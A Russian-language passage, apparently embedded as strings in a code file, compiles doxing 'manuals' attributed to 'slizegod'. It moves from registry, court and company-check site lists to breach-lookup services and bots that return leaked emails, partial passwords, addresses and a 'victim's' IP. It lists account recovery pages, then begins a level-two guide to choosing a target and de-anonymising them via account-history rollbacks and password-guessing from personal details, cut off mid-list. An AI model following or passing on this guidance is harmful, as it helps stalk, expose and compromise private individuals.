или нет банковские счета  конкретного юридического лица или ИП\nhttp://services.fms.gov.ru/ – проверка действительности паспортов и другие сервисы от ФМС России.\nhttp://zakupki.gov.ru/223/dishonest/public/supplier-search.html – реестр недобросовестных поставщиков.\nhttp://fedsfm.ru/documents/terrorists-catalog-portal-act – реестр террористов и экстримистов \nhttp://www.stroi-baza.ru/forum/index.php?showforum=46 — «черный список» по российским строительным компаниям.\nhttp://xn--90afdbaav0bd1afy6eub5d.xn--p1ai/ – единая база данных решений судов общей юрисдикции РФ.\nhttp://www.centerdolgov.ru/ –  информация о недобросовестных компаниях-должниках России, Украины,  Белоруссии, Казахстана. Поиск компаний, ИНН, стране  и городу.\nhttp://ras.arbitr.ru/ -высший арбитражный суд РФ с картотекой арбитражных дел и банком решения арбитражных судов.\nhttps://rosreestr.ru/wps/portal/cc_information_online – справочная информация по объектам недвижимости от Федеральной службы государственной регистрации\nhttp://www.voditeli.ru/ — база данных о водителях грузовых автомашин, создана с целью выявления «хронических» летунов, алкоголиков, ворья и прочих.\nhttp://www.gcourts.ru/ –  поисковик и одновременно справочник от Yandex по судам общей  юрисдикции.\nhttp://www.e-disclosure.ru/ – сервер раскрытия информации по эмитентам ценных бумаг РФ.\nhttp://www.fssprus.ru/ – картотека арбитражных дел Высшего Арбитражного Суда Российской Федерации\nhttp://rnp.fas.gov.ru/ – Реестр недобросовестных поставщиков ФАС РФ\nhttps://rosreestr.ru/wps/portal/p/cc_present/EGRN_1—  портал услуг Федеральной Службы Государственной Регистрации, Кадастра и  Картографии\nhttp://www.notary.ru/notary/bd.html —  нотариальный портал. Содержит список с координатами всех частных  практикующих нотариусов России и нотариальных палат\nhttp://allchop.ru/ — Единая база всех частных охранных предприятий\nhttp://enotpoiskun.ru/tools/codedecode/ — Расшифровка кодов ИНН, КПП, ОГРН и др. \nhttp://polis.autoins.ru/ — Проверка полисов ОСАГО по базе Российского союза автостраховщиков\nhttp://www.vinformer.su/ident/vin.php?setLng=ru — Расшифровка VIN транспортных средств \nhttp://fssprus.ru/ - Федералная служба судебных приставов\nhttp://fssprus.ru/iss/ip - Банк данных исполнительных производств\nhttp://fssprus.ru/iss/ip_search - Реестр розыска по исполнительным производствам\nhttp://fssprus.ru/iss/suspect_info - Лица, находящиеся в розыске по подозрению в совершении преступлений\nhttp://fssprus.ru/gosreestr_jurlic/ - Сведения, содержащиеся в государственном реестре юридических лиц,\nосуществляющих деятельность по возврату просроченной задолженности в качестве основного вида деятельности\nhttp://opendata.fssprus.ru/ - открытые данные Федеральной службы судебных приставов\nhttp://sro.gosnadzor.ru/ - Государственный реестр саморегулируемых организаций\nhttp://zakupki.gov.ru/epz/dishonestsupplier/quicksearch/search.html - Сведения из реестра недобросовестных поставщиков\n(подрядчиков, исполнителей) и реестра недобросовестных подрядных организаций\nhttps://rosreestr.ru/wps/portal/online_request - Справочная информация по объектам недвижимости\nhttps://rosreestr.ru/wps/portal/p/cc_present/EGRN_1 - Форма запроса сведений ЕГРН\nhttps://rosreestr.ru/wps/portal/p/cc_ib_portal_services/cc_ib_sro_reestrs - Реестры саморегулируемых организаций\nhttps://rosreestr.ru/wps/portal/cc_ib_opendata - Наборы открытых данных Росреестра\nhttps://pkk5.rosreestr.ru/ - Публичная кадастровая карта \nhttps://www.reestr-zalogov.ru/search/index - Реестр уведомлений о залоге движимого имущества\nhttps://мвд.рф/wanted - Внимание, розыск!\nhttps://www.mos.ru/karta-moskvicha/services-proverka-grazhdanina-v-reestre-studentov/ - Проверка гражданина в реестре студентов/ординаторов/аспирантов (держатели карты москвича)\nhttp://esugi.rosim.ru - Реестр федерального имущества Российской Федерации\npd.rkn.gov.ru/operators-registry - Реестр операторов, осуществляющих обработку персональных данных\nbankrot.fedresurs.ru - Единый федеральный реестр сведений о банкротстве                                                                                               \nhttps://service.nalog.ru/zd.do - Сведения о юридических лицах, имеющих задолженность по уплате налогов и/или не представляющих налоговую отчетность более года\nhttps://service.nalog.ru/addrfind.do - Адреса, указанные при государственной регистрации в качестве места нахождения несколькими юридическими лицами\nhttps://service.nalog.ru/uwsfind.do - Сведения о юридических лицах и индивидуальных предпринимателях, в отношении которых представлены документы для государственной регистрации\nhttps://service.nalog.ru/disqualified.do - Поиск сведений в реестре дисквалифицированных лиц\nhttps://service.nalog.ru/disfind.do - Юридические лица, в состав исполнительных органов которых входят дисквалифицированные лица\nhttps://service.nalog.ru/svl.do - Сведения о лицах, в отношении которых факт невозможности участия (осуществления руководства) в организации установлен (подтвержден) в судебном порядке\nhttps://service.nalog.ru/mru.do - Сведения о физических лицах, являющихся руководителями или учредителями (участниками) нескольких юридических лиц\nhttp://rkn.gov.ru/mass-communications/reestr/ – реестры Госкомнадзора.\nhttp://www.chinacheckup.com/ – лучший платный ресурс по оперативной и достоверной верификации китайских компаний.\nhttp://www.dnb.com/products.html - модернизированный ресурс одной из лучших в мире компаний в сфере бизнес-информации Dun and Bradstreet.\nhttp://www.imena.ua/blog/ukraine-database/ – 140+ общедоступных электронных баз данных Украины.\nhttp://www.fciit.ru/ – eдиная информационная система нотариата России.\nhttp://gradoteka.ru/ – удобный сервис статистической информации по городам РФ.\nhttp://www.egrul.ru/ - сервис по поиску сведений о компаниях и директорах из государственных реестров юридических лиц России и 150 стран мира.\nhttp://disclosure.skrin.ru - уполномоченное ФСФР (Федеральной службой по финансовым рынкам) на раскрытие информации на рынке ценных бумаг агентство ЗАО “СКРИН”.\nhttp://1prime.ru/docs/product/disclosure.html – уполномоченное ФСФР (Федеральной службой по финансовым рынкам) на раскрытие информации на рынке ценных бумаг агентство ЗАО “Прайм-ТАСС”.\nhttps://www.cbr.ru/ - информация ЦБ по бюро кредитных историй, внесенных в государственный реестр.\nhttp://www.gks.ru/accounting_report – предоставление данных бухгалтерской отчетности по запросам пользователей от Федеральной службы государственной статистики.\nhttp://www.tks.ru/db/ – таможенные онлайн базы данных.\nhttp://tipodop.ru/ - очередной каталог предприятий, организаций в России.\nhttp://www.catalogfactory.org/ – организации России – финансовые результаты, справочные данные и отзывы. Данные в настоящее время доступны по 4,8 млн.организаций.\nhttp://pravo.ru/ – справочно-информационная система, включающая в настоящее время 40 млн. законодательных, нормативных и поднормативных актов Российской Федерации.\nhttp://azstatus.ru/ – информационная база данных, в которой содержится информация обо всех предпринимателях Российской Федерации, а также информация о российских компаниях (юридические лица). Всего в справочнике более 10 миллионов записей.\nhttp://seldon.ru/ – информационно-аналитическая система, значительно упрощающая и систематизирующая работу с закупками.\nhttp://www.reestrtpprf.ru/ – реестр надежных партнеров от системы Торгово-промышленных палат в Российской Федерации.\nhttp://iskr-a.com/ – сообщество безопасников и платформа для информационного взаимодействия в одном флаконе.\nhttp://www.ruscentr.com/ - реестр базовых организаций российской экономики, добросовестных поставщиков и бюджетоэффективных заказчиков (организаций).\nhttps://www.aips-ariadna.com/ – антикриминальная онлайн система учета по России и СНГ. Относится к тому же ценовому сегменту, что и «Контур Фокус» и т.п., и отличается от других систем большим уклоном в судебные и правоохранительные данные. Ориентирована прежде всего на службу безопасности.\nhttp://188.254.71.82/rds_ts_pub/ – единый реестр зарегистрированных деклараций РФ.\nhttp://croinform.ru/index.php?page=index – сервис проверки клиентов, конкурентов, партнеров и контрагентов в режиме реального времени 24/7, в т.ч. со смартфона. Цены вполне человеческие. Сервис знаменитого Кроноса.\nhttp://www.zakupki.gov.ru/epz/main/public/home.html – официальный сайт Российской Федерации для размещения информации о размещении заказов на поставки товаров, выполнение работ, оказание услуг.\nhttp://rostender.info/ – ежедневная рассылка новых тендеров в соответствии с отраслевыми и региональными настройками.\nhttp://pravo.fso.gov.ru/ – государственная система правовой информации. Позволяет быть в курсе всех новых правовых актов. Имеет удобный поисковик.\nhttp://www.bicotender.ru/ - самая полная поисковая система тендеров и закупок по России и странам СНГ.\nhttp://sophist.hse.ru/ – единый архив экономических и социологических данных по российской Федерации от НИУ ВШЭ.\nhttp://www.tenderguru.ru/ – национальный тендерный портал, представляет собой единую базу государственных и коммерческих тендеров с ежедневной рассылкой анонсов по объявленным тендерам.\nhttp://www.moscowbase.ru/ - поддерживаемые в состоянии постоянной актуальности адресно-телефонные базы данных по компаниям Москвы и России. Уникальным продуктом компании являются базы данных новых компаний, появившихся в течение двух последних кварталов. В данные включается вся стандартная информация, предоставляемая платными онлайн базами, плюс актуальные внутренние телефоны и e-mail.\nhttp://www.credinform.ru/ru-RU/globas - информационно-аналитическая система ГЛОБАС – I содержит данные о семи миллионах компаний. Предназначена для комплексной информационной поддержке бизнеса и создания комплексных аналитических отчетов.\nhttp://www.actinfo.ru/ – отраслевой бизнес-справочник предприятий России по их актуальным почтовым адресам и контактным телефонам. Единственный справочник, который включает контактные данные по предприятиям, созданным в предыдущем квартале.\nhttp://www.sudrf.ru/ -государственная автоматизированная система РФ «Правосудие».\nhttp://docs.pravo.ru/ – справочно-правовая система Право.ру. Предоставляет полный доступ к нормативным документам любых субъектов Российской Федерации, а также к судебной практике арбитражных судов и мнениям экспертов любых юридических областей. Ежемесячная плата для работы с полной базой документов составляет 500 руб.\nhttp://www.egrul.com/ – платные и бесплатные сервисы поиска по ЕГРЮЛ, ЕГРИП, ФИО, балансам предприятий и др. параметрам. Одно из лучших соотношений цены и качества.\nhttp://www.fedresurs.ru/ – единый федеральный реестр сведений о фактах деятельности юридических лиц.\nhttp://www.findsmi.ru/ – бесплатный сервис поиска данных по 65 тыс. региональных СМИ.\nhttp://hub.opengovdata.ru/ – хаб, содержащий открытые государственные данные всех уровней, всех направлений. Проект Ивана Бегтина.\nhttp://www.ruward.ru/ – ресурс агрегатор всех рейтингов Рунета. В настоящее время уже содержит 46 рейтингов и более 1000 компаний из web и PR индустрии.\nhttp://www.b2b-energo.ru/firm_dossier/ - информационно-аналитическая и торгово-операционная система рынка продукции, услуг и технологий для электроэнергетики.\nhttp://opengovdata.ru/ – открытые базы данных государственных ресурсов\nhttp://bir.1prime.ru/ – информационно-аналитическая система «Бир-аналитик» позволяет осуществлять поиск данных и проводить комплексный анализ по всем хозяйствующим субъектам России, включая компании, кредитные организации, страховые общества, регионы и города.\nhttp://www.prima-inform.ru/ – прямой доступ к платным и бесплатным информационным ресурсам различных, в т.ч. контролирующих организаций. Позволяет получать документы и сводные отчеты, информацию о российских компаниях, индивидуальных предпринимателях и физических лицах, сведения из контролирующих организаций. Позволяет проверять субъектов на аффилированность и многое другое.\nhttp://www.integrum.ru/ –портал для конкурентной разведки с самым дружественным интерфейсом. Содержит максимум информации, различных баз данных, инструментов мониторинга и аналитики. Позволяет компании в зависимости от ее нужд, размеров и бюджета выбирать режим пользования порталом.\nwww.spark-interfax.ru – портал обладает необходимой для потребностей конкурентной разведки полнотой баз данных, развитым функционалом, постоянно добавляет новые сервисы.\nhttps://fira.ru/ – молодой быстроразвивающийся проект, располагает полной и оперативной базой данных предприятий, организаций и регионов. Имеет конкурентные цены.\nwww.skrin.ru – портал информации об эмитентах ценных бумаг. Наряду с обязательной информацией об эмитентах содержит базы обзоров предприятий, отраслей, отчетность по стандартам РБУ, ГААП, ИАС. ЗАО “СКРИН” является организацией, уполномоченной ФСФР.\nhttp://www.magelan.pro/ – портал по тендерам, электронным аукционам и коммерческим закупкам. Включает в себя качественный поисковик по данной предметной сфере.\nhttp://www.kontragent.info/ – ресурс предоставляет информацию о реквизитах контрагентов и реквизитах, соответствующих ведению бизнеса.\nhttp://www.ist-budget.ru/ – веб-сервис по всем тендерам, госзаказам и госзакупкам России. Включает бесплатный поисковик по полной базе тендеров, а также недорогой платный сервис, включающий поиск с использованием расширенных фильтров, по тематическим каталогам. Кроме того, пользователи портала могут получать аналитические отчеты по заказчикам и поставщикам по тендерам. Есть и система прогнозирования возможных победителей тендеров.\nhttp://www.vuve.su/ - портал информации об организациях, предприятиях и компаниях, ведущих свою деятельность в России и на территории СНГ. На сегодняшний день база портала содержит сведения о более чем 1 млн. организаций.\nhttp://www.disclosure.ru/index.shtml - система раскрытия информации на рынке ценных бумаг Российской Федерации. Включает отчетность эмитентов, существенные новости, отраслевые обзоры и анализ тенденций.\nhttp://www.mosstat.ru/index.html – бесплатные и платные онлайн базы данных и сервисы по ЕГРПО и ЕГРЮЛ Москвы и России, а также бухгалтерские балансы с 2005 года по настоящее время. По платным базам самые низкие тарифы в Рунете. Хорошая навигация, удобная оплата, качественная и оперативная работа.\nhttp://www.torg94.ru/ – качественный оперативный и полезный ресурс по госзакупкам, электронным торгам и госзаказам.\nhttp://www.k-agent.ru/ – база данных «Контрагент». Состоит из карточек компаний, связанных с ними документов, списков аффилированных лиц и годовых бухгалтерских отчетов. Документы по компаниям представлены с 2006 г. Цена в месяц 900 руб. Запрашивать данные можно на сколь угодно много компаний.\nhttp://www.is-zakupki.ru/ – информационная система государственных и коммерческих закупок. В системе собрана наиболее полная информация по государственным, муниципальным и коммерческим закупкам по всей территории РФ. Очень удобна в работе, имеет много дополнительных сервисов и, что приятно, абсолютно разумные, доступные даже для малого бизнеса цены.\nhttp://salespring.ru/ – открытая пополняемая база данных деловых контактов предприятий России и СНГ и их сотрудников. Функционирует как своеобразная биржа контактов.\nwww.multistat.ru – многофункциональный статистический портал. Официальный портал ГМЦ Росстата.\n\nПробив:\nhttp://results.audit.gov.ru/ – портал открытых данных Счетной палаты Российской Федерации.\nhttp://sudact.ru/ – ресурс по судебным и нормативным актам, включающим решения судов общей юрисдикции, арбитражных судов и мировых судей с качественным удобным поисковиком.\nhttp://www.cbr.ru/credit/main.asp – справочник по кредитным организациям. Сведения ЦБ РФ о банках и прочих кредитных организациях, об отзывах лицензий на осуществление банковских операций и назначениях временных администраций, раскрытие информации и пр.\nhttps://service.nalog.ru/inn.do – сервис определения ИНН физического лица.\nhttps://service.nalog.ru/bi.do – сервис позволяет выяснить, заблокированы или нет банковские счета конкретного юридического лица или индивидуального предпринимателя.\nhttp://188.254.71.82/rds_ts_pub/ – национальная часть единого реестра зарегистрированных таможенных деклараций, позволяющая определить кто, что, когда и откуда привез в нашу страну.\nhttp://services.fms.gov.ru/ – проверка действительности паспортов и другие сервисы от ФМС России.\nhttp://zakupki.gov.ru/223/dishonest/public/supplier-search.html – реестр недобросовестных поставщиков.\nhttp://fedsfm.ru/documents/terrorists-catalog-portal-act – ресурс позволяет проверить, не являются ли ваши клиенты, контрагенты, конкуренты, и не дай бог, партнеры террористами или экстремистами.\nhttp://www.stroi-baza.ru/forum/index.php?showforum=46 - «черный список» по российским строительным компаниям.\nhttp://xn--90afdbaav0bd1afy6eub5d.xn--p1ai/ – единая база данных решений судов общей юрисдикции РФ.\nhttp://web-compromat.com/service.html – набор сайтов, облегчающих проверку компаний и физических лиц.\nhttp://www.centerdolgov.ru/ – информация о недобросовестных компаниях-должниках России, Украины, Белоруссии, Казахстана. Поиск возможен по названию компаний, ИНН, стране и городу.\nhttp://www.egrul-base.ru/ - проверка клиентов, контрагентов, конкурентов за 15-30 минут. Проверка включает в себя поиск по «черным спискам», определение фактического хозяина бизнеса, связи компании, ее учредителей, генерального директора с другими организациями. Информация из ЕГРЮЛ. Цена 500 руб.\nhttp://ras.arbitr.ru/ -Высший арбитражный суд РФ с картотекой арбитражных дел и банком решения арбитражных судов.\nhttp://bankrot.fedresurs.ru/ – единый федеральный реестр сведений о банкротстве.\nhttp://sts.gov.ua/businesspartner - лучший сервис проверки контрагентов, клиентов, конкурентов в Украине от Налоговой службы страны. Позволяет проверять юридическое лицо не только по собственным данным налоговой службы, но и другим открытым базам данных государственных порталов Украины. В России такого пока нет.\nhttps://rosreestr.ru/wps/portal/cc_information_online – справочная информация по объектам недвижимости в режиме он-лайн от Федеральной службы государственной регистрации, кадастра и картографии.\nhttp://www.nomer.org/moskva/ – телефонная база г.Москвы. Содержит адреса и телефоны всех московских квартир, в которых установлен телефон, и не только МГТС.\nhttp://www.nomer.org/ - телефонный справочник городов России и СНГ\nhttp://spravkaru.net/ – онлайн телефонный справочник по городам и регионам России.\nhttp://www.info4help.com/ - телефонный справочник городов России (не проверялась, платная)\nhttp://www.voditeli.ru/ - база данных о водителях грузовых автомашин, создана с целью выявления "хронических" летунов, алкоголиков, ворья и прочих.\nhttp://telbase.spb.ru/ - Адресная и телефонная база Санкт-Петербурга (не проверялась, платная)\nhttp://tapix.ru -Телефонный справочник городов России и бывших республик СССР (не проверялась, платная)\nhttp://rossvyaz.ru/activity/num_resurs/registerNum/ – полезный поисковик, позволяющий определить оператора по номеру или фрагменту номера телефона оператора, месторасположение и т.п. За наводку спасибо Vinni.\nhttp://www.rospravosudie.com/ – поисковик-сервис по судебным решениям в России. Содержит все опубликованные судебные решения, список судей Российской Федерации, а также список действующих адвокатов. По каждому судье можно посмотреть списки его решений. Предоставляет статистику преступлений по регионам. Является некоммерческим проектом.\nhttp://www.salyk.kz/ru/taxpayer/interaktiv/Pages/default.aspx – официальный портал Налогового комитета Министерства финансов республики Казахстан. Располагает рядом удобных сервисов, включая реестр плательщиков НДС, поиск налогоплательщиков в республике и проч.\nhttps://focus.kontur.ru/ - лучший в Рунете по соотношению цены и качества сервис проверки клиентов, контрагентов и т.п. , пользуясь официальными источниками статистики. Наряду с получением данных по отдельной организации позволяет в качестве дополнительной опции искать аффилированные между собой организации, а также пересечение по генеральным директорам, собственникам и т.п.\nФедеральная Информационная Адресная Система – позволяет установить наличие или отсутствие любого адреса в любом месте в стране. Если точно такого адреса нет, то система выдаст наиболее близкие.\nhttp://alexandr-sel.livejournal.com/33499.html#cutid1 – исчерпывающая и структурированная база ресурсов для проверки компаний на территории Республики Беларусь.\nhttp://fellix13.livejournal.com/6683.html – необходимый набор ресурсов для проверки конрагентов на Украине от Сергея Коржова.\nhttp://mbcredit.ru/ – в группу компаний Cronos входят ЗАО МБКИ, которое предоставляет качественные бизнес-справки и в режиме он-лайн осуществляет проверку кредитных историй по любым компаниям и персоналиям по конкурентным ценам , а также многое другое. Цены вполне конкурентные.\nttp://cases.pravo.ru/ – картотека арбитражных дел. При помощи сервиса вы получаете доступ к любому делу в любом арбитражном суде. Достаточно указать известные вам параметры. Искать надо при помощи правой колонки. Поиск можно вести по участникам дела (название организации или ИНН), по фамилии судьи, по номеру дела, фильтровать по датам.\nhttp://www.gcourts.ru/ – поисковик и одновременно справочник от Yandex по судам общей юрисдикции. Позволяет искать по номерам дел, ответчикам, истцам, отслеживать прохождение дел по всем инстанциям. Просто неоценимый инструмент для безопасников и разведчиков.\nhttps://service.nalog.ru/debt/ – сервис «Узнай свою задолженность» позволяет пользователям узнавать не только свою задолженность, но осуществлять поиск информации о задолженности по имущественному, транспортному, земельному налогам, налогу на доходы физических лиц, граждан РФ.\nhttp://www.law-soft.ru/ – информация о предприятиях, находящихся в стадии банкротства, обобщается из «Коммерсанта», «Российской газеты». Информация с 2007 года по настоящее время. Через расширенный поиск Yandex отлично ищется по сайту.\nhttp://egrul.nalog.ru/ – отсюда можно почерпнуть сведения, внесенные в Единый Государственный Реестр Юридических Лиц.\nhttp://www.e-disclosure.ru/ – сервер раскрытия информации по эмитентам ценных бумаг РФ.\nhttp://www.fssprus.ru/ – картотека арбитражных дел Высшего Арбитражного Суда Российской Федерации\nhttp://www.mgodeloros.ru/register/search/ – база данных должников, в которой зарегистрированы все физические и юридические лица как частного, так и публичного права (кроме государственных и органов местного самоуправления, а также тех субъектов, имущество которых сдано в ипотеку или в заклад), в отношении которых начата процедура принудительного исполнения.\nhttp://rnp.fas.gov.ru/?rpage=687&status=find – Реестр недобросовестных поставщиков ФАС РФ\nПортал услуг - портал услуг Федеральной Службы Государственной Регистрации, Кадастра и Картографии, где можно получить сведения о земельной собственности и расположенной на ней недвижимости.\nhttp://services.fms.gov.ru/info-service.htm?sid=2000 – официальный сайт Федеральной миграционной службы России, где можно получить информацию о наличии/отсутствии регистрации того или иного гражданина на территории РФ и некоторую иную информацию.\nhttp://www.notary.ru/notary/bd.html - нотариальный портал. Содержит список с координатами всех частных практикующих нотариусов России и нотариальных палат. Для зарегистрированных пользователей доступна судебная практика нотариусов и файловый архив. База обновляется ежедневно.\nhttp://kad.arbitr.ru/ – он-лайн картотека Арбитражного Суда Российской Федерации. Чрезвычайно полезна при умелом использовании для конкурентной разведки.\nhttp://allchop.ru/ - Единая база всех частных охранных предприятий\nhttp://enotpoiskun.ru/tools/codedecode/ - Расшифровка кодов ИНН, КПП, ОГРН и др.\nhttp://enotpoiskun.ru/tools/accountdecode/ - Расшифровка счетов кредитных организаций\nhttp://polis.autoins.ru/ - Проверка полисов ОСАГО по базе Российского союза автостраховщиков\nhttp://www.mtt.ru/ru/defcodes/ - Коды мобильных операторов. Очень удобный поиск.\nhttp://www.vinformer.su/ident/vin.php?setLng=ru - Расшифровка VIN транспортных средств\nhttp://www.vinvin.ru/about.html - Проверка VIN транспортных средств по американским БД "CARFAX" и "AutoCheck"\nhttp://www.stolencars24.eu/ - Проверка на угон проверка по полицейским базам данных Италии, Словении, Румынии, Словакии и Чехии, а также по собственной базе данных (без ограничения количества запросов)\nhttp://www.autobaza.pl/ - Проверка на угон в Италии, Словении, Литве (не более 3 запросов в сутки с одного IP)\nhttp://www.alta.ru/trucks/truck.php - Расчет таможенных платежей при ввозе автомобилей из-за границы\nhttp://kupipolis.ru/ - Расчет КАСКО, ОСАГО\nhttp://ati.su/Trace/Default.aspx - Расчет расстояний между населенными пунктами по автодорогам\nhttp://www.garant.ru/doc/busref/spr_dtp/ - Штрафы за нарушение Правил дорожного движения онлайн\nhttp://fotoforensics.com/ - Сервис для проверки подлинности фотографии, выявление изменений метаданных и т.п.\nhttp://mediametrics.ru/rating/ru/online.html - Онлайн сервис по отслеживанию популярных тем в социальных сетях и СМИ\nhttp://poiskmail.com/ Поисk чeлoвeкa по емейлу\nhttp://socpoisk.com/search/ -поиск людей\nhttp://radaris.ru/ -поиск людей\nhttp://pervoiskatel.ru/ -поиск людей\nhttp://spys.ru/vk/ - Проверить ID скрытого пользователя Вконтакте, просмотр закрытой станицы Vkontakte\nhttp://pasport.yapl.ru/search.php - Сайт по пробиву серии номера пасспорта,регион ,год выдачи документа\nhttps://огрн.онлайн/ - удобный ресурс для поиска аффилированных компаний у конкретных юр./физ.лиц и многое другое.\nhttps://www.a-3.ru/pay_gibdd - Штрафы ГИБДД - онлайн проверка и оплата. По номеру машины и другим данным.\nhttp://services.fms.gov.ru/info-service.htm?sid=2000 - Проверка действительности паспорта гражданина РФ Главное управление по вопросам миграции МВД России - Проверка по списку недействительных российских паспортов\nhttps://service.nalog.ru/inn-my.do - Узнай свой ИНН\nhttp://www.russianpost.ru/resp_engine.aspx?barCode=12 - Отслеживание почтовых отправлений Почта России.\nEasyFinance.ru - Контроль личных расходов и доходов\nhttp://www.rossvyaz.ru/activity/num_resurs/registerNum/ - Как достоверно узнать по коду или номеру телефона, какому оператору связи принадлежит этот номер и в каком регионе Федеральное агентство связи (Россвязь) - Выписка из реестра Российской системы и плана нумерации\nhttp://www.creditnet.ru/search/?type=adv - Узнать данные про фирму и директора и ИНН и ОГРН и т.д. по названию фирмы Поиск — НКБ\nhttp://www.ispark.ru/ru-ru/ - Узнать по ФИО, какие на человеке фирмы Электронный магазин СПАРК – информация по российским компаниям\nhttp://in-drive.ru/vinstealing.html- Авто проверить на угон в РФ\nhttp://rospravosudie.com/ - Про всех юристов, судей и т.д. Суды, адвокаты и судебные решения - все здесь, 100+ миллионов решений - РосПравосудие\nhttp://lawyers.minjust.ru/Lawyers - Реестр адвокатов России Онлайн\nhttp://notaries.minjust.ru/Notaries - Реестр нотариусов онлайн\nhttp://www.fskn.gov.ru/pages/main/attention/index.shtml - Онлайн розыск ФСКН с ФОТО\nhttp://www.banki.ru/banks/memory/?utm_source=google - Прекратившие существование банки\nhttps://service.nalog.ru/debt/ - Узнай свою задолженность\nhttp://www.fssprus.ru/iss/ip/ - Банк данных исполнительных производств судебных приставов\nhttp://avto-nomer.ru/search - По государственному регистрационному номеру можно найти фото автомобиля по России\nhttp://egrul.nalog.ru - Единый государственный реестр юридических лиц\nhttp://www.kartoteka.ru/ - Бесплатно узнать ведёт фирма деятельность или нет\nhttps://www.bindb.com/bin-database.html - Сервис проверки банковских карт - по первым 6 цифрам номера показывает тип карты\nhttps://focus.kontur.ru - Быстрый поиск организаций и ИП по ИНН, ОГРН, адресу, наименованию, ФИО\n\nПолезные боты \n\n@SafeCallsBot — бесплатные анонимные звонки на любой номер телефона\n\n@GetFb_bot — бот находит Facebook\n\n\nfth.so - бесплатный сервис с множеством бд  Minecraft ( можно найти почту и айпи жертвы )\n\n haveibeenpwned.com — проверка почты на наличие в слитых базах\n emailrep.io — найдет на каких сайтах был зарегистрирован аккаунт использующий определенную почту\n dehashed.com — проверка почты в слитых базах\n @Smart_SearchBot — найдет ФИО, дату рождения и адрес с телефоном\n intelx.io — многофункциональный поисковик, поиск осуществляется еще и по даркнету\n @mailsearchbot — ищет по базе, дает часть пароля\n @info_baza_bot — покажет из какой базы слита почта, 2 бесплатных скана\n leakedsource.ru — покажет в каких базах слита почта\n mostwantedhf.info — найдет аккаунт skype\nOSINT SITE:\n\nПоиск по USERNAME/NICKNAME:\n- https://namechk.com/\n\nПоиск по EMAIL:\n- https://haveibeenpwned.com/\n- https://hacked-emails.com/\n- https://ghostproject.fr/\n- https://weleakinfo.com/\n- https://pipl.com/\n- https://leakedsource.ru/\n- Приложение "Skype"\n\nПоиск по номеру телефона:\n- https://phonenumber.to\n- https://pipl.com/\n- Приложение "GetContact"\n- Приложение "NumBuster"\n- Приложение "Truecaller" или сайт https://www.truecaller.com/\n- http://doska-org.ru/\n- Приложение "Skype"\n\nОбщий поиск по соц. сетям, большой набор разных инструментов для поиска:\n- http://osintframework.com/\n\nПоиск местоположения базовой станции сотового оператора:\n- http://unwiredlabs.com\n- http://xinit.ru/bs/\n\nПолучение фотографий из соц. сетей из локального района (по геометкам):\n- http://sanstv.ru/photomap\n\n\n\n@Eye_OfGod_bot - Нормальный платный бот в тг, функционал и прайс сами чекните\n\n@AvinfoBot — найдет аккаунт в ВК\n\nvkpt.info (t) — мониторинг деятельности пользователя, поиск старых друзей, покажет, кому ставит лайки, все комментарии пользователя, скрытые друзья\n\nМощный инструмент для пробива по Number - https://github.com/sundowndev/PhoneInfoga\n\ngrep.app — поиск в репозиториях GitHub\n\nFacebook\nЕсли вы узнали Facebook ID через сервисы по типу lampyre.io, нужно узнать по этому ID страницу.Об этом писалось на одноименном посте на стаковерфлоу.\nСсылка - https://stackoverflow.com/questions/12827775/facebook-user-url-by-id\nСервисы: graph.tips\nwhopostedwhat.com\nlookup-id.com (Узнать айди аккаунта фейсбук)\n\nТак же можно искать ID аккаунта в гугл, тем самым получив больше зацепок.\n@usersbox_bot (Найдет аккаунты VK, у которых указан данный Facebook)\n\n\nОбщий поиск по соц. сетям, большой набор разных инструментов для поиска:\nhttp://osintframework.com/\n\n\nВосстановление:\n\nEbay (https://signin.ebay.com/ws/eBayISAPI.dll?SignIn) — signin.ebay.com/ws/eBayISAPI.dll?SignIn\nPayPal (https://www.paypal.com/authflow/password-recovery) — paypal.com/authflow/password-recovery\nMail.ru (https://account.mail.ru/recovery/) — account.mail.ru/recovery\nTwitter (https://twitter.com/account/begin_password_reset) — twitter.com/account/begin_password_reset\nVK.com (https://vk.com/restore) — vk.com/restore\nFacebook (https://www.facebook.com/login/identify?ctx=recover) — facebook.com/login/identify?ctx=recover\n\n\nmunscanner.com (https://munscanner.com/dbs/) — поиск по реестрам компаний разных стран\n\ninfobel.com — найдет номер телефона, адрес и ФИО\n\nНа этом пожалуй все, доксинг 1 лвл окончен. Мануал был написан Слайзом ( Slize Redwise - @slizegod )\n',
            "Докс (manual by slizegod lvl 2)": 'Всех приветсвую, это мануал по доксингу 2-ому лвлу от Слайза.\nСвязь - @slizegod\n\nНачнем\n\n2-ой лвл доксинга не такой уж и простой но не такой уж и сложный\n\nМожно начать с того что сперва вам нужно выбрать цель которую вы собираетесь задеанонимизировать.\n\nВыбрав цель вы приступаете анализировать его страницу в Вк или Телеграм да бы увидеть зацепку которая вас приведет к разоблачению.\n\nОткат страницы в вк - @vkhistoryrobot\nОткат аккаунта телеграм - глаз бога или же @telesint\n\nБлагодаря откату можно увидеть ошибки которые допустила ваша жертва, в вк это может быть номер в био \nа в телеграмме это может быть имя или город в чатах для общения.\n\nБлиже к обучению \n\n1. Формирование задач\n На этом этапе нужно четко понимать что нужно получить в конечном итоге. Это могут быть, например, ники, которые использует цель. Или нужно пробить абсолютно всю информацию о человеке в интернете. Как правило, ключевыми данными для отправки служат номера телефонов, адреса электронной почты, ники или зацепки в социальных сетях.\nЭтап 2. Планирование\nЛичные (социальные сети, блоги, сайты, никнеймы и т.д.).\nГосударственные (реестры, базы, суды, налоги, пограничные базы, базы дипломов, база недействительных паспортов и т.д.).\nВнешние источники (друзья, знакомые, СМИ, работодатели, рекомендации).\n Очень важно визуализировать. Для этого лучше всего использовать XMind, MindMap, Maltego или другие подобные приложения. Для каждой цели нужно делать свою дорожную карту.\nСбор информации\nЭтот этап самый трудоёмкий, но в основном он реализуется с помощью набора софта и онлайн-сервисов. Подходя к этому этапу у вас есть должна быть какая-нибудь предварительная информация. Например, вы знаете, что человек использует в качестве пароля фамилию своей первой учительницы. И, допустим, она есть у нашей жертвы в друзьях во ВКонтакте. Это существенно сужает круг и становится ясно куда нужно смотреть в первую очередь.\nНо иногда такой информации нет и нужно искать абсолютно всё. Сначала лучше начать с имени, фамилии и никнейма. Дальше можно раскручивать и искать телефон, список друзей, строить связи в социальных сетях и форумах. Но как показывает практика, почти все результаты поиска базируются на трех вещах: номер телефона, электронная почта и никнейм.\n\n Я собрал подборку сайтов и ботов по различным данным:\n\nПоиск по Nickname:\n@maigret_osint_bot-найдет аккаунты с таким ником среди 2000+ сайтов, дает самый точный результат 